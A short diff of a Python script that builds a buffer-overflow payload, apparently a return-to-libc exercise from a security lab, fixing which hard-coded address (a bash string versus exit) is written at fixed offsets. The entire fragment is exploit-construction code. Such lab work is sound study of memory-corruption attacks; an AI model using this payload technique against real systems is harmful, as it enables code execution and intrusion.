@@ -4,7 +4,7 @@ if __name__ == "__main__":
     payload = bytearray(0xaa for i in range(517))
 
     bash_addr = 0xbffffdf1
-    payload[44:48] = (exit_addr).to_bytes(4, byteorder="little")
+    payload[44:48] = (bash_addr).to_bytes(4, byteorder="little")
 
     exit_addr = 0xb7e369d0
     payload[40:44] = (exit_addr).to_bytes(4, byteorder="little")
